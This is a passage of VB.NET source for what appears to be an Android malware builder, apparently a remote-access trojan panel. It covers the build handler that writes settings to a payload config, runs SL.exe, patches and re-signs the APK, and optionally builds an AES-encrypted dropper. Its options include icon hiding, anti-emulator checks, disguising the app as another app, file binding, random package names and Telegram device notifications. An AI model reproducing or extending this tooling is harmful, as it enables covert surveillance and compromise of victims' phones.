                MessageBox.Show("SL.exe build timed out after 3 minutes.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            End If
        End Using
    End Sub

    Private Function FormatBuildIssue(raw As String) As String
        If String.IsNullOrWhiteSpace(raw) Then Return "Unknown build error"
        Dim text As String = raw.Trim()
        If text.StartsWith("apk patch:", StringComparison.OrdinalIgnoreCase) Then
            text = text.Substring("apk patch:".Length).Trim()
        ElseIf text.StartsWith("sign:", StringComparison.OrdinalIgnoreCase) Then
            Return "Signing failed — check Building-6.1\\apktool keys and Java"
        End If

        Dim lower As String = text.ToLowerInvariant()
        If lower.Contains("0x03") OrElse lower.Contains("invalid character") OrElse lower.Contains("недопустимым знаком") Then
            Return "Manifest patch error (AndroidManifest.xml). Rebuild — should be fixed now."
        End If
        If lower.Contains("apktool decode failed") Then
            Return "APK decode failed — install Java and check apktool.zip in Payload"
        End If
        If lower.Contains("apktool build failed") Then
            Return "APK rebuild failed — smali or manifest issue"
        End If
        If lower.Contains("java runtime not found") Then
            Return "Java not found — install JRE/JDK and add to PATH"
        End If
        Return text
    End Function

    Private Sub ApplyApkNotifyPatch(notifyCfg As NotifySettingsHelper.NotifyConfig, protectionCfg As ApkProtectionPatcher.ProtectionConfig, resourcesPath As String)
        Dim patchErrors As New List(Of String)
        Dim distApkPath As String = ApkNotifyPatcher.GetBuildingDistApkPath()
        Dim clientApkPath As String = ApkNotifyPatcher.GetBuildingClientApkPath()
        Dim patchFailed As Boolean = False
        Dim patchReport As ApkNotifyPatcher.NotifyPatchReport = Nothing

        Dim needPatch As Boolean = notifyCfg.Enabled OrElse ApkProtectionPatcher.NeedsSmaliPatch(protectionCfg) OrElse (protectionCfg IsNot Nothing AndAlso protectionCfg.StealthEnabled)

        If needPatch AndAlso File.Exists(distApkPath) Then
            Dim patchErr As String = Nothing
            If Not ApkNotifyPatcher.TryPatchApk(distApkPath, notifyCfg, protectionCfg, patchErr) Then
                patchFailed = True
                patchErrors.Add(FormatBuildIssue("apk patch: " & patchErr))
                Dim bakPath As String = distApkPath & ".notify.bak"
                If File.Exists(bakPath) Then
                    Try
                        File.Copy(bakPath, distApkPath, True)
                    Catch
                    End Try
                End If
            End If
            patchReport = ApkNotifyPatcher.GetLastNotifyPatchReport()
        ElseIf Not File.Exists(distApkPath) Then
            patchErrors.Add("Unsigned APK not found after SL.exe build")
        End If

        If notifyCfg.Enabled AndAlso patchReport IsNot Nothing Then
            If Not patchReport.ProviderInManifest AndAlso Not patchReport.LauncherHookApplied AndAlso Not patchReport.ApplicationHookApplied Then
                patchErrors.Add("APK notify: no entry point found (provider/launcher/application)")
            ElseIf Not patchReport.LauncherHookApplied AndAlso Not patchReport.ApplicationHookApplied Then
                patchErrors.Add("APK notify: launcher hook missing — relies on provider only")
            End If
        End If

        Dim signErr As String = Nothing
        If Not ApkNotifyPatcher.TrySignDistToClient(signErr) Then
            patchErrors.Add(FormatBuildIssue("sign: " & signErr))
        End If

        Dim apkSizeKb As Long = 0
        If File.Exists(clientApkPath) Then
            apkSizeKb = New FileInfo(clientApkPath).Length \ 1024
        End If

        Dim summary As New BuildResultSummary With {
            .Success = patchErrors.Count = 0 AndAlso ApkNotifyPatcher.IsValidApkFile(clientApkPath),
            .ApkPath = clientApkPath,
            .ApkSizeKb = apkSizeKb,
            .NotifyEnabled = notifyCfg.Enabled,
            .NotifyType = If(notifyCfg.NotifyType, "Telegram"),
            .NotifyCredentialsOk = DeviceNotifyService.NotifyCredentialsConfigured(notifyCfg),
            .NotifyInApk = ApkNotifyPatcher.ApkContainsNotifyCode(clientApkPath),
            .PanelNotifyEnabled = notifyCfg.Enabled,
            .ProtectionEnabled = protectionCfg IsNot Nothing AndAlso protectionCfg.Enabled,
            .AntiEmulator = protectionCfg IsNot Nothing AndAlso protectionCfg.AntiEmulator,
            .HideIcon = protectionCfg IsNot Nothing AndAlso protectionCfg.HideIconAfterSetup,
            .MaskType = If(protectionCfg IsNot Nothing, protectionCfg.MaskType, String.Empty),
            .FakeActivity = ApkProtectionPatcher.ResolveFakeActivity(protectionCfg),
            .PackageName = If(protectionCfg IsNot Nothing, protectionCfg.PackageName, String.Empty),
            .DropperEnabled = chkDropperMode IsNot Nothing AndAlso chkDropperMode.Checked,
            .PatchFailed = patchFailed,
            .LauncherHookApplied = patchReport IsNot Nothing AndAlso patchReport.LauncherHookApplied,
            .ApplicationHookApplied = patchReport IsNot Nothing AndAlso patchReport.ApplicationHookApplied,
            .ProviderInManifest = patchReport IsNot Nothing AndAlso patchReport.ProviderInManifest,
            .ReceiverInManifest = patchReport IsNot Nothing AndAlso patchReport.ReceiverInManifest
        }
        summary.Errors = patchErrors
        BuildResultDialog.ShowResult(Me, summary)
    End Sub

    ' ----- Переопределение методов GenerateAESKey и EncryptPayload (уже есть) -----
    ' Они уже присутствуют в вашем коде, я их не дублирую.

    ' ----- Обновлённый обработчик ThemeButton2_Click (с вызовом Dropper) -----
    Private Sub ThemeButton2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton2.Click
        Try
            ' ---- Сохраняем настройки ----
            SaveSettings()
            SaveProtectionSettings()
            SaveDropperSettings()
            NotifySettingsHelper.SaveNotifyConfig(GetNotifyConfigFromUi())
            DeviceNotifyService.ResetNotifyDedup()

            ' ---- Готовим параметры ----
            Dim protectionCfg = GetProtectionConfigFromUi()
            If Not protectionCfg.HideIconAfterSetup Then
                Me.Pi1.Tag = "-"
            Else
                Me.Pi1.Tag = "OK"
            End If

            If protectionCfg.Enabled Then
                Dim maskLabel As String = ApkProtectionPatcher.ResolveMaskLabel(protectionCfg.MaskType)
                If Not String.IsNullOrWhiteSpace(maskLabel) Then
                    Me.TextBox2.Text = maskLabel
                End If
            End If

            Dim packageName As String = txtPackageName.Text.Trim()
            If String.IsNullOrEmpty(packageName) Then
                packageName = GenerateRandomPackageName()
                txtPackageName.Text = packageName
            End If
            If protectionCfg.Enabled AndAlso Not String.IsNullOrWhiteSpace(protectionCfg.PackageName) Then
                Me.TextBox3.Text = protectionCfg.PackageName.Trim()
                packageName = protectionCfg.PackageName.Trim()
            End If
            Dim aesKey As Byte() = GenerateAESKey(packageName)
            Dim appName As String = Me.TextBox2.Text
            Dim iconPath As String = Me.Label1.Tag?.ToString()

            ' ---- Остальной код билда (как было) ----
            Dim stringBuilder As New StringBuilder()
            stringBuilder.Append(Operators.ConcatenateObject(Me.Label1.Tag, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox1.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox2.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox3.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox4.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox5.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox6.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox7.Text, "" & vbCrLf & ""))
            Dim str As String = BuildPermissionFlags()
            stringBuilder.Append(String.Concat(str, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.Label14.Text, "" & vbCrLf & ""))
            stringBuilder.Append(String.Concat(Me.TextBox8.Text, "" & vbCrLf & ""))
            Dim sInfPath As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
            Dim notifyCfg = GetNotifyConfigFromUi()
            protectionCfg.PermissionFlags = BuildPermissionFlags()

            If File.Exists(sInfPath) Then
                Using sw As New StreamWriter(sInfPath)
                    sw.Write(stringBuilder.ToString())
                End Using
                Dim slExe As String = String.Concat(Store.Resources(1), "\Imports\Payload\SL.exe")
                If File.Exists(slExe) Then
                    RunSlExeAndWait(slExe)
                End If
            End If

            ApplyApkNotifyPatch(notifyCfg, protectionCfg, Store.Resources(1))

            ' ---- Если включён Dropper Mode ----
            Dim grpDropper As GroupBox = GetDropperGroupBox()
            Dim chkDropper As CheckBox = Nothing
            If grpDropper IsNot Nothing Then
                chkDropper = TryCast(grpDropper.Controls("chkDropperMode_Dropper"), CheckBox)
            End If
            If chkDropper IsNot Nothing AndAlso chkDropper.Checked Then
                BuildDropper(packageName, aesKey, appName, iconPath)
            End If

            MyBase.Close()
        Catch ex As Exception
            MessageBox.Show("Build error: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' ----- Остальные методы (защита, нотификатор) остаются без изменений -----
    ' (Они уже есть в вашем коде)

    ' ----- Таймер -----
    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TextBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles TextBox1.KeyPress
        If ("+_)(*&^%$#@!~`\|\/*-<>:}{][,.?b=_;'""".Contains(Conversions.ToString(e.KeyChar))) Then
            e.Handled = True
        End If
    End Sub

    Private Sub ThemeButton1_Click(sender As Object, e As EventArgs) Handles ThemeButton1.Click
        Try
            Dim defaultIcon As String = String.Concat(Store.Resources(1), "\Icons\devico\gp.png")
            If Operators.ConditionalCompareObjectEqual(Me.ThemeButton1.Tag, "0", False) Then
                Using ofd As New OpenFileDialog()
                    ofd.Filter = "PNG Image (*.png)|*.png|All files (*.*)|*.*"
                    ofd.Title = "Select App Icon"
                    If ofd.ShowDialog() = DialogResult.OK Then
                        Me.PictureBox1.ImageLocation = ofd.FileName
                        Me.Label1.Tag = ofd.FileName
                        Me.Label1.Text = ofd.FileName
                        Me.ThemeButton1.Text = "Delete"
                        Me.ThemeButton1.Tag = "1"
                    End If
                End Using
            Else
                If File.Exists(defaultIcon) Then
                    Me.PictureBox1.ImageLocation = defaultIcon
                    Me.Label1.Tag = defaultIcon
                End If
                Me.Label1.Text = "default"
                Me.ThemeButton1.Text = "Select icon"
                Me.ThemeButton1.Tag = "0"
            End If
        Catch
        End Try
    End Sub

    Private Sub ThemeButton3_Click(sender As Object, e As EventArgs) Handles ThemeButton3.Click
        Try
            If Operators.ConditionalCompareObjectEqual(Me.ThemeButton3.Tag, "0", False) Then
                Using ofd As New OpenFileDialog()
                    ofd.Filter = "All files (*.*)|*.*"
                    ofd.Title = "Select Bind File"
                    If ofd.ShowDialog() = DialogResult.OK Then
                        Me.Label14.Text = ofd.FileName
                        Me.TextBox8.Enabled = True
                        Me.Label15.Enabled = True
                        Me.TextBox8.Text = Path.GetFileNameWithoutExtension(ofd.FileName)
                        Me.ThemeButton3.Tag = "1"
                        Me.ThemeButton3.Text = "Delete"
                    End If
                End Using
            Else
                Me.Label14.Text = ".."
                Me.TextBox8.Text = ".."
                Me.TextBox8.Enabled = False
                Me.Label15.Enabled = False
                Me.ThemeButton3.Tag = "0"
                Me.ThemeButton3.Text = "Select File"
            End If
        Catch
        End Try
    End Sub

    Private Sub TogglePermissionToggle(ByVal pi As SN.PI)
        If (Not Operators.ConditionalCompareObjectEqual(pi.Tag, "OK", False)) Then
            pi.Tag = "OK"
        Else
            pi.Tag = "-"
        End If
    End Sub

    Private Sub Pi1_Click_1(sender As Object, e As EventArgs) Handles Pi1.Click
        TogglePermissionToggle(Me.Pi1)
    End Sub

    Private Sub Pi2_Click(sender As Object, e As EventArgs) Handles Pi2.Click
        TogglePermissionToggle(Me.Pi2)
    End Sub

    Private Sub Pi3_Click(sender As Object, e As EventArgs) Handles Pi3.Click
        TogglePermissionToggle(Me.Pi3)
    End Sub

    Private Sub Pi4_Click(sender As Object, e As EventArgs) Handles Pi4.Click
        TogglePermissionToggle(Me.Pi4)
    End Sub

    Private Sub Pi5_Click(sender As Object, e As EventArgs) Handles Pi5.Click
        TogglePermissionToggle(Me.Pi5)
    End Sub

    Private Sub Pi6_Click(sender As Object, e As EventArgs) Handles Pi6.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi6.Tag, "OK", False)) Then
            Me.TextBox7.Enabled = True
            Me.Pi6.Tag = "OK"
            If (Operators.CompareString(Me.sGet, Nothing, False) = 0) Then
                Me.TextBox7.Text = ""
            Else
                Me.TextBox7.Text = Me.sGet
            End If
        Else
            Me.TextBox7.Enabled = False
            Me.Pi6.Tag = "-"
            If (Operators.CompareString(Me.TextBox7.Text, "null", False) <> 0) Then
                Me.sGet = Me.TextBox7.Text
            End If
            Me.TextBox7.Text = "null"
        End If
    End Sub

    Private Sub btnGeneratePackage_Click_1(sender As Object, e As EventArgs) Handles btnGeneratePackage.Click
        Me.txtPackageName.Text = GenerateRandomPackageName()
    End Sub

    Private Sub cbMaskType_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cbMaskType.SelectedIndexChanged

    End Sub
End Class